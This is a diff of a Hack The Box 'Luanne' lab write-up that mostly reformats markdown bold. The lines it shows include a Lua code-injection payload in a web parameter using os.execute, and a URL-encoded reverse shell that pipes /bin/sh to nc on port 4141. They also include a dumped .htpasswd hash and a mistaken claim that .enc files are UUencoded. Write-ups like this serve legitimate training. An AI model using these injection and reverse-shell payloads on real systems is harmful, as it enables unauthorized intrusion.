@@ -1,6 +1,6 @@
 ![](luanne_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -37,17 +37,17 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 
 ## Web_server - Port 80
 
-* __gobuster__ inside `/weather` directory -
+* **gobuster** inside `/weather` directory -
 
 	`gobuster dir -u http://10.10.10.218/weather/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 40`
 
 	  /forecast (Status: 200)
 
-* __Goto__ `http://10.10.10.218/weather/forecast` through an error - 
+* **Goto** `http://10.10.10.218/weather/forecast` through an error - 
 
 	  {"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
 
-* specifying `city=list` in the url and __Goto__ `http://10.10.10.218/weather/forecast?city=list` give the list of cities -
+* specifying `city=list` in the url and **Goto** `http://10.10.10.218/weather/forecast?city=list` give the list of cities -
 
 	  {"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
 
@@ -60,9 +60,9 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 * Error specified that the backend is running `lua` language.
 * try diffrent lua syntex and finaly execute lua syntex - 
 
-__Request:__ `http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--`
+**Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--`
 
-__Response:__ `{"code": 500,"error": "unknown city: pwn`
+**Response:** `{"code": 500,"error": "unknown city: pwn`
 
   * brackdown the payload - 
     1. payload is url encoded formate
@@ -71,13 +71,13 @@ __Response:__ `{"code": 500,"error": "unknown city: pwn`
 * there is a `os.execute` function in the lua that exeecute shell command from lua syntex.
 * create a code executation payload with lua runtime - 
 
-  __Payload:__ `');os.execute("id")--`
+  **Payload:** `');os.execute("id")--`
 
-  __[URL-Enode](https://www.url-encode-decode.com/):__ `%27%29%3Bos.execute%28%22id%22%29--`
+  **[URL-Enode](https://www.url-encode-decode.com/):** `%27%29%3Bos.execute%28%22id%22%29--`
 
-  __Request:__ `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--`
+  **Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--`
 
-  __Response:__ `"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)`
+  **Response:** `"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)`
 
 * and this verified the command execuation vulnerbility.
 
@@ -85,13 +85,13 @@ __Response:__ `{"code": 500,"error": "unknown city: pwn`
 
 ## USER:_httpd shell
 
-__Reverse shell: Payload:__ `');os.execute("rm  /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0 4141 >/tmp/f")--`
+**Reverse shell: Payload:** `');os.execute("rm  /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0 4141 >/tmp/f")--`
 
-__[URL-Enode](https://www.url-encode-decode.com/):__ `%27%29%3Bos.execute%28%22rm%2520+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+tun0+4141+%3E%2Ftmp%2Ff%22%29--`
+**[URL-Enode](https://www.url-encode-decode.com/):** `%27%29%3Bos.execute%28%22rm%2520+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+tun0+4141+%3E%2Ftmp%2Ff%22%29--`
 
-__Request:__ `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20tun0%204141%20%3E%2Ftmp%2Ff%22%29--`
+**Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20tun0%204141%20%3E%2Ftmp%2Ff%22%29--`
 
-__Response:__ `nc -nvlp 4141`
+**Response:** `nc -nvlp 4141`
 
 ```diff
  listening on [any] 4141 ...
@@ -115,7 +115,7 @@ $ cat .htpasswd
 +webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
 ```
 
-__Hash:__ `webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0`
+**Hash:** `webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0`
 
 ### john
 
@@ -282,11 +282,11 @@ dr-xr-x---  7 r.michaels  users   512 Sep 16 18:20 ..
 -r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
 ```
 
-__enc file extention:__ The .enc file extension is used by files in the UUenconded format, which are encrypted files.
+**enc file extention:** The .enc file extension is used by files in the UUenconded format, which are encrypted files.
 
-__UUenconded format:__ Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.
+**UUenconded format:** Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.
 
-__Tool:__ in openbsd there is tool called [netpgp](https://man.netbsd.org/netpgp.1) that can be use to encrypt or decrypt. 
+**Tool:** in openbsd there is tool called [netpgp](https://man.netbsd.org/netpgp.1) that can be use to encrypt or decrypt. 
 
 * decrypt `.enc` file
 ```diff
